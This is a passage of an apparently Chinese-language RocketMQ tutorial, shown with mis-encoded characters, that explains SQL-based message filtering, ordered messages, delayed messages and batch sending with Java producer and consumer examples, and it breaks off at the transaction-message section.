<p>ç”Ÿäº§è€…è¿˜æ˜¯æŒ‡å®šæ ‡ç­¾ ABCï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰å†™å…¥å±æ€§ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterProducer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// ç”Ÿäº§è€…å‘é€å¸¦è‡ªå®šä¹‰å±æ€§çš„æ¶ˆæ¯</span>
                msg.putUserProperty(<span class="hljs-string">"orderId"</span>, <span class="hljs-string">"123456"</span>);
                msg.putUserProperty(<span class="hljs-string">"qty"</span>, String.valueOf(<span class="hljs-number">10</span> + i));
                <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</span>
        producer.shutdown();
    }
}
</code></pre>
<p>æ¶ˆè´¹è€…é€šè¿‡ SQL è¿›è¡Œè¿‡æ»¤</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// é…ç½®è®¢é˜…ä¸»é¢˜Topicã€SQL</span>
        consumer.subscribe(TOPIC,
                MessageSelector.bySql(<span class="hljs-string">"(TAGS IS NOT NULL AND TAGS IN ('TagA', 'TagB)) "</span> +
                        <span class="hljs-string">"AND (orderId IS NOT NULL AND qty &gt; 15)"</span>));
        <span class="hljs-comment">// è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>è¿‡æ»¤å‡ºæ ‡ç­¾æ˜¯ TagA å’Œ TagB ä»¥åŠ qty å¤§äº 15 å¹¶ä¸” orderId ä¸èƒ½ä¸ºç©ºã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤æ‚ä¸šåŠ¡è¿‡æ»¤ï¼Œå¦‚æ ¹æ®è®¢å•é‡‘é¢ã€æ—¶é—´èŒƒå›´ã€ç”¨æˆ·ç­‰çº§ç­‰å¤šç»´åº¦ç­›é€‰æ¶ˆæ¯ã€‚</p>
<blockquote>
<p>æ³¨ï¼šé€šè¿‡ TAGS è¿‡æ»¤æ˜¯ä¸ç”¨æ‹…å¿ƒæ€§èƒ½é—®é¢˜ï¼Œä½†æ˜¯é€šè¿‡è‡ªå®šä¹‰å±æ€§å°±ä¼šé€ æˆæ€§èƒ½é—®é¢˜ã€‚ RocketMQ ä¸­è¢«è¿‡æ»¤æ‰çš„æ¶ˆæ¯ä¸ä¼šæ¶ˆå¤±ï¼Œè¿‡æ»¤åªæ˜¯é™åˆ¶è¿™äº›æ¶ˆæ¯æŠ•é€’ç»™å½“å‰åŒ¹é…è¿‡æ»¤æ¡ä»¶çš„æ¶ˆè´¹è€…ï¼Œæ¶ˆæ¯æœ¬èº«çš„ç”Ÿå‘½å‘¨æœŸå®Œå…¨ç”± Broker çš„å­˜å‚¨ç­–ç•¥å†³å®šï¼Œå’Œæ˜¯å¦è¢«è¿‡æ»¤æ²¡æœ‰å…³ç³»ã€‚</p>
<p>ç”±äºæ¨¡ç³ŠåŒ¹é…ï¼ˆç‰¹åˆ«æ˜¯ %xxx è¿™ç§å‰ç½®é€šé…ç¬¦ï¼‰ä¼šå¯¼è‡´ Broker æ— æ³•åˆ©ç”¨ç´¢å¼•ï¼Œå¿…é¡»é€æ¡æ‰«ææ¶ˆæ¯å±æ€§ï¼Œåœ¨æ¶ˆæ¯é‡å·¨å¤§æ—¶ä¼šä¸¥é‡å½±å“æ€§èƒ½ã€‚å¦‚æœå¯èƒ½ï¼Œå»ºè®®åœ¨å‘é€æ¶ˆæ¯æ—¶å°†éœ€è¦æ¨¡ç³ŠåŒ¹é…çš„ç»´åº¦æ‹†åˆ†ä¸ºç‹¬ç«‹çš„æ¶ˆæ¯å±æ€§ï¼ˆä¾‹å¦‚å°† orderType æ‹†åˆ†ä¸º prefix å’Œ suffix ä¸¤ä¸ªå±æ€§ï¼‰ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨ Tag è¿›è¡Œç²—ç²’åº¦è¿‡æ»¤ï¼Œå†åœ¨æ¶ˆè´¹ç«¯è¿›è¡Œç»†ç²’åº¦çš„æ¨¡ç³ŠåŒ¹é…ã€‚</p>
</blockquote>
<h3 data-id="heading-21">5 é¡ºåºæ¶ˆæ¯</h3>
<p>RocketMQ çš„é¡ºåºæ¶ˆæ¯ï¼ˆFIFO æ¶ˆæ¯ï¼‰æ˜¯ä¸€ç§**é«˜çº§æ¶ˆæ¯ç±»å‹<strong>ï¼Œæ”¯æŒæ¶ˆè´¹è€…æŒ‰ç…§å‘é€æ¶ˆæ¯çš„å…ˆåé¡ºåºè·å–æ¶ˆæ¯ï¼Œä»è€Œå®ç°ä¸šåŠ¡åœºæ™¯ä¸­çš„é¡ºåºå¤„ç†ã€‚å®ƒé€šè¿‡</strong>æ¶ˆæ¯ç»„ (MessageGroup)** æœºåˆ¶ä¿è¯<strong>å±€éƒ¨é¡ºåº</strong>ï¼Œåœ¨æ»¡è¶³ä¸šåŠ¡é¡ºåºéœ€æ±‚çš„åŒæ—¶å…¼é¡¾ç³»ç»Ÿååèƒ½åŠ›ã€‚</p>
<h4 data-id="heading-22">ç”Ÿäº§ç«¯ï¼šä¿è¯å‘é€é¡ºåº</h4>
<ul>
<li><strong>é˜Ÿåˆ—é€‰æ‹©å™¨</strong>ï¼šé€šè¿‡<code>MessageQueueSelector</code>å°†åŒä¸€ä¸šåŠ¡æ ‡è¯†ï¼ˆå¦‚è®¢å• IDï¼‰çš„æ¶ˆæ¯è·¯ç”±åˆ°<strong>åŒä¸€ä¸ªé˜Ÿåˆ—</strong>ï¼Œé¿å…è·¨é˜Ÿåˆ—ä¹±åº</li>
<li><strong>åŒæ­¥å‘é€</strong>ï¼šå¿…é¡»ä½¿ç”¨<strong>åŒæ­¥å‘é€</strong>ï¼ˆ<code>send()</code>ï¼‰ï¼Œç¦æ­¢å¼‚æ­¥å‘é€ï¼Œç¡®ä¿æ¶ˆæ¯å‘é€æˆåŠŸåå†å‘é€ä¸‹ä¸€æ¡</li>
<li><strong>æ¶ˆæ¯ç»„æœºåˆ¶</strong>ï¼šæ–°ç‰ˆ RocketMQ é€šè¿‡<code>MessageGroup</code>å±æ€§æ ‡è®°æ¶ˆæ¯å½’å±ï¼ŒæœåŠ¡ç«¯è‡ªåŠ¨è·¯ç”±åˆ°å¯¹åº”é˜Ÿåˆ—ã€‚</li>
</ul>
<blockquote>
<p>â½£äº§è€…åªæœ‰å°†â¼€æ‰¹æœ‰é¡ºåºè¦æ±‚çš„æ¶ˆæ¯ï¼Œæ”¾åˆ°åŒâ¼€ä¸ªMesasgeQueueä¸Šï¼Œé€šè¿‡MessageQueueçš„FIFOç‰¹æ€§ä¿è¯è¿™â¼€æ‰¹æ¶ˆæ¯çš„é¡ºåºã€‚å¦‚æœä¸æŒ‡å®šMessageSelectorå¯¹è±¡ï¼Œé‚£ä¹ˆâ½£äº§è€…ä¼šé‡‡â½¤è½®è¯¢çš„â½…å¼å°†å¤šæ¡æ¶ˆæ¯ä¾æ¬¡å‘é€åˆ°ä¸åŒçš„MessageQueueä¸Šã€‚</p>
</blockquote>
<p>ç”Ÿäº§è€…æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”Ÿäº§è€…å‘é€é¡ºåºæ¶ˆæ¯</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueueSelector</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> MessageQueue <span class="hljs-title function_">select</span><span class="hljs-params">(List&lt;MessageQueue&gt; mqs, Message msg, Object arg)</span> {
        <span class="hljs-comment">// æŒ‰è®¢å•IDå“ˆå¸Œé€‰æ‹©é˜Ÿåˆ—ï¼Œç¡®ä¿åŒä¸€è®¢å•æ¶ˆæ¯è¿›å…¥åŒä¸€é˜Ÿåˆ—</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> (Integer) arg;
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> orderId % mqs.size();
        <span class="hljs-keyword">return</span> mqs.get(index);
    }
}, orderId); <span class="hljs-comment">// ä¼ é€’è®¢å•IDä½œä¸ºè·¯ç”±å‚æ•°</span>
</code></pre>
<h4 data-id="heading-23">æ¶ˆè´¹ç«¯ï¼šä¿è¯å¤„ç†é¡ºåº</h4>
<ul>
<li><strong>é¡ºåºæ¶ˆè´¹æ¨¡å¼</strong>ï¼šä½¿ç”¨<code>MessageListenerOrderly</code>ï¼ˆè€Œéå¹¶å‘æ¨¡å¼<code>MessageListenerConcurrently</code>ï¼‰</li>
<li><strong>é˜Ÿåˆ—ç‹¬å </strong>ï¼šåŒä¸€é˜Ÿåˆ—åŒä¸€æ—¶é—´ä»…åˆ†é…ç»™<strong>ä¸€ä¸ªæ¶ˆè´¹çº¿ç¨‹</strong>ï¼Œçº¿ç¨‹æŒ‰æ¶ˆæ¯é¡ºåºä¸²è¡Œå¤„ç†</li>
<li><strong>é˜Ÿåˆ—é”æœºåˆ¶</strong>ï¼šæ¶ˆè´¹ç«¯é€šè¿‡<code>ConsumeOrderlyContext</code>è‡ªåŠ¨åŠ é”ï¼Œé˜²æ­¢åŒä¸€é˜Ÿåˆ—è¢«å¤šçº¿ç¨‹å¹¶å‘æ¶ˆè´¹ã€‚</li>
</ul>
<blockquote>
<p>æ¶ˆè´¹è€…éœ€è¦å®ç°MessageListenerOrderlyæ¥â¼ï¼Œå®é™…ä¸Šåœ¨æœåŠ¡ç«¯ï¼Œå¤„ç†MessageListenerOrderlyæ—¶ï¼Œä¼šç»™â¼€ä¸ªMessageQueueåŠ é”ï¼Œæ‹¿åˆ° MessageQueueä¸Šæ‰€æœ‰çš„æ¶ˆæ¯ï¼Œç„¶åå†å»è¯»å–ä¸‹â¼€ä¸ªMessageQueueçš„æ¶ˆæ¯ã€‚</p>
</blockquote>
<p>æ¶ˆè´¹è€…æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java">consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerOrderly</span>() {
    <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">consumeTimes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>);
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeOrderlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context)</span> {
        context.setAutoCommit(<span class="hljs-literal">true</span>);
        System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msgs);
        <span class="hljs-built_in">this</span>.consumeTimes.incrementAndGet();
        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
            context.setSuspendCurrentQueueTimeMillis(<span class="hljs-number">3000</span>);
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
        }

        <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
    }
});
</code></pre>
<p>åŸç†å°±æ˜¯å°†æ¶ˆæ¯éƒ½å‘åˆ°åŒä¸€ä¸ªMessageQueueã€‚å…·ä½“å¯ä»¥çœ‹å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F03fifomessage%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/03fifomessage/" ref="nofollow noopener noreferrer">é¡ºåºæ¶ˆæ¯ | RocketMQ</a></p>
<blockquote>
<p>æ³¨ï¼š</p>
<p>1ã€ä¸€èˆ¬åœºæ™¯ä¸‹æ˜¯å±€éƒ¨æœ‰åºï¼Œå¦‚æœéœ€è¦å…¨å±€æœ‰åºï¼Œé‚£å°±å°†æ¶ˆæ¯ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ª MessageQueue ã€‚</p>
<p>2ã€â½£äº§è€…ç«¯å°½å¯èƒ½å°†åŒä¸€ç»„æœ‰åºæ¶ˆæ¯æ‰“æ•£åˆ°ä¸åŒçš„ MessageQueue ä¸Šï¼Œé¿å…è¿‡äºé›†ä¸­å¯¼è‡´æ•°æ®çƒ­ç‚¹ç«äº‰ã€‚</p>
<p>3ã€æ¶ˆè´¹è€…ç«¯åªè¿›â¾æœ‰é™æ¬¡æ•°çš„é‡è¯•ã€‚å¦‚æœâ¼€æ¡æ¶ˆæ¯å¤„ç†å¤±è´¥ï¼ŒRocketMQä¼šå°†åç»­æ¶ˆæ¯é˜»å¡ä½ï¼Œè®©æ¶ˆè´¹è€…è¿›â¾é‡è¯•ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ¶ˆè´¹è€…â¼€ç›´å¤„ç†å¤±è´¥ï¼Œè¶…è¿‡æœ€â¼¤é‡è¯•æ¬¡æ•°ï¼Œé‚£ä¹ˆRocketMQå°±ä¼šè·³è¿‡è¿™â¼€æ¡æ¶ˆæ¯ï¼Œå¤„ç†åâ¾¯çš„æ¶ˆæ¯ï¼Œè¿™ä¼šé€ æˆæ¶ˆæ¯ä¹±åºã€‚</p>
<p>4ã€æ¶ˆè´¹è€…ç«¯å¦‚æœç¡®å®å¤„ç†é€»è¾‘ä¸­å‡ºç°é—®é¢˜ï¼Œä¸å»ºè®®æŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥è¿”å› <code>ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT</code>ä½œä¸ºæ›¿ä»£ã€‚</p>
</blockquote>
<h3 data-id="heading-24">6 å»¶è¿Ÿæ¶ˆæ¯</h3>
<p>RocketMQ çš„å»¶è¿Ÿæ¶ˆæ¯æ˜¯ä¸€ç§é«˜çº§æ¶ˆæ¯ç‰¹æ€§ï¼ŒæŒ‡æ¶ˆæ¯å‘é€åˆ° Broker åï¼Œä¸ä¼šç«‹å³è¢«æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œè€Œæ˜¯åœ¨æŒ‡å®šæ—¶é—´ï¼ˆæˆ–å»¶è¿Ÿçº§åˆ«å¯¹åº”çš„æ—¶é—´ï¼‰åæ‰æŠ•é€’åˆ°ç›®æ ‡ Topic ä¾›æ¶ˆè´¹è€…å¤„ç†ã€‚è¯¥æœºåˆ¶å¹¿æ³›åº”ç”¨äºè®¢å•è¶…æ—¶å¤„ç†ã€å®šæ—¶ä»»åŠ¡è°ƒåº¦ã€é€šçŸ¥æé†’ç­‰åœºæ™¯ã€‚</p>
<h4 data-id="heading-25">6.1 åŸç†</h4>
<p>æ¶ˆæ¯å‘é€åï¼Œåœ¨å›ºå®šçš„æ—¶é—´åæ‰è¢«æ¶ˆè´¹ï¼Œå®˜æ–¹æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸¤è€…æœ¬è´¨ç›¸åŒï¼Œå‡é€šè¿‡æœåŠ¡ç«¯å®šæ—¶è°ƒåº¦å®ç°ï¼Œ5.x ç‰ˆæœ¬ç»Ÿä¸€ç§°ä¸ºå®šæ—¶æ¶ˆæ¯ã€‚</p>
<ul>
<li>RocketMQ 4.x é»˜è®¤æ”¯æŒ18 ä¸ªå›ºå®šå»¶è¿Ÿçº§åˆ«ï¼Œä¸æ”¯æŒä»»æ„æ—¶é—´å»¶è¿Ÿã€‚</li>
</ul>
<p>Broker é…ç½®å¯è‡ªå®šä¹‰å»¶è¿Ÿçº§åˆ«ï¼š<code>messageDelayLevel=1s 5s 10s 30s 1m ... 1h 2h</code></p>
<ul>
<li>RocketMQ 5.x å¼•å…¥<strong>ç²¾ç¡®å®šæ—¶æ¶ˆæ¯</strong>ï¼Œæ”¯æŒæ¯«ç§’çº§ä»»æ„æ—¶é—´å»¶è¿Ÿï¼Œé€šè¿‡è®¾ç½®ç»å¯¹æ—¶é—´æˆ³å®ç°ã€‚</li>
</ul>
<h4 data-id="heading-26">6.2 ä»£ç æ¡ˆä¾‹</h4>
<p>ç”Ÿäº§è€…çš„æ ¸å¿ƒä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
message.setDelayTimeLevel(<span class="hljs-number">3</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.print(result);
</code></pre>
<p>é€šè¿‡è®¾ç½®å»¶è¿Ÿæ—¶é—´çº§åˆ« <code>message.setDelayTimeLevel(3)</code>ä»£è¡¨ 10 ç§’åå‘é€ã€‚Broker æ¥æ”¶æ¶ˆæ¯åï¼Œåˆ¤æ–­ä¸ºå»¶è¿Ÿæ¶ˆæ¯ï¼Œå°†å…¶æš‚å­˜åˆ°å†…éƒ¨ä¸»é¢˜ <code>SCHEDULE_TOPIC_XXXX</code>ã€‚Broker å¯åŠ¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹æ± ï¼Œæ¯ä¸ªå»¶è¿Ÿçº§åˆ«å¯¹åº”ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œå®šæ—¶ä»»åŠ¡å‘¨æœŸæ€§æ‰«æå¯¹åº”é˜Ÿåˆ—ï¼Œåˆ¤æ–­æ¶ˆæ¯æ˜¯å¦åˆ°æœŸï¼ˆå­˜å‚¨æ—¶é—´ + å»¶è¿Ÿæ—¶é—´â‰¤å½“å‰æ—¶é—´ï¼‰ï¼Œåˆ°æœŸæ¶ˆæ¯è¢«é‡æ–°æŠ•é€’åˆ°åŸå§‹ç›®æ ‡ Topic çš„å¯¹åº”é˜Ÿåˆ—ï¼Œæ¶ˆè´¹è€…æ­¤æ—¶å¯æ­£å¸¸æ¶ˆè´¹è¯¥æ¶ˆæ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
<span class="hljs-comment">//message.setDelayTimeSec(10);</span>
<span class="hljs-comment">// The effect is the same as the above</span>
<span class="hljs-comment">// message.setDelayTimeMs(10_000L);</span>
<span class="hljs-comment">// Set the specific delivery time, and the effect is the same as the above</span>
<span class="hljs-comment">// long deliverTime = LocalDateTime.of(2026, 1, 20, 10, 0, 0)</span>
<span class="hljs-comment">//     .atZone(ZoneId.systemDefault())</span>
<span class="hljs-comment">//     .toInstant()</span>
<span class="hljs-comment">//     .toEpochMilli();</span>
<span class="hljs-comment">// message.setDeliverTimeMs(deliverTime);</span>
message.setDeliverTimeMs(System.currentTimeMillis() + <span class="hljs-number">10_000L</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.printf(result + <span class="hljs-string">"\n"</span>);
</code></pre>
<p>æ—¶é—´è½®å°†æ—¶é—´åˆ’åˆ†ä¸ºå›ºå®šæ§½ä½ï¼Œæ¯ä¸ªæ§½ä½å¯¹åº”ä¸€ä¸ªæ—¶é—´é—´éš”ã€‚æ¶ˆæ¯æ ¹æ®åˆ°æœŸæ—¶é—´æ”¾å…¥å¯¹åº”æ§½ä½ï¼Œé€šè¿‡æŒ‡é’ˆå¾ªç¯æ‰«æå¤„ç†åˆ°æœŸæ¶ˆæ¯ã€‚å…·ä½“å¯ä»¥çœ‹å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2F4.x%2Fproducer%2F04message3%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/4.x/producer/04message3/" ref="nofollow noopener noreferrer">å»¶è¿Ÿæ¶ˆæ¯å‘é€ | RocketMQ</a></p>
<h3 data-id="heading-27">7 æ‰¹é‡æ¶ˆæ¯</h3>
<p>åœ¨å¯¹ååç‡æœ‰ä¸€å®šè¦æ±‚çš„æƒ…å†µä¸‹ï¼ŒApache RocketMQå¯ä»¥å°†ä¸€äº›æ¶ˆæ¯èšæˆä¸€æ‰¹ä»¥åè¿›è¡Œå‘é€ï¼Œå¯ä»¥å¢åŠ ååç‡ï¼Œå¹¶å‡å°‘APIå’Œç½‘ç»œè°ƒç”¨æ¬¡æ•°ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/754201307eb444768f601d7063b74053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=BLwYES%2FKE8GZk329Xnh5dRyoEPQ%3D" alt="" loading="lazy"/></p>
<p>æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ·»åŠ æ‰¹é‡æ¶ˆæ¯</span>
List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(MESSAGE_COUNT);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
    messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, TAG, <span class="hljs-string">"OrderID"</span> + i, (<span class="hljs-string">"Hello world "</span> + i).getBytes(StandardCharsets.UTF_8)));
}

<span class="hljs-comment">// æ¶ˆæ¯è¿‡å¤šéœ€è¦åˆ†ç‰‡</span>
<span class="hljs-type">ListSplitter</span> <span class="hljs-variable">splitter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListSplitter</span>(messages);
<span class="hljs-keyword">while</span> (splitter.hasNext()) {
    List&lt;Message&gt; listItem = splitter.next();
    <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(listItem);
    System.out.printf(<span class="hljs-string">"%s"</span>, sendResult);
}
</code></pre>
<blockquote>
<p>æ³¨ï¼š</p>
<p>æ‰¹é‡æ¶ˆæ¯çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œä½†æ˜¯è¦æ³¨æ„RocketMQåšäº†é™åˆ¶ã€‚åŒä¸€æ‰¹æ¶ˆæ¯çš„Topicå¿…é¡»ç›¸åŒï¼Œå¦å¤–ï¼Œä¸æ”¯æŒå»¶è¿Ÿæ¶ˆæ¯ã€‚</p>
<p>è¿˜æœ‰æ‰¹é‡æ¶ˆæ¯çš„å¤§å°ä¸è¦è¶…è¿‡1Mï¼Œå¦‚æœå¤ªå¤§å°±éœ€è¦è‡ªè¡Œåˆ†å‰²ã€‚</p>
</blockquote>
<h3 data-id="heading-28">8 äº‹åŠ¡æ¶ˆæ¯</h3>
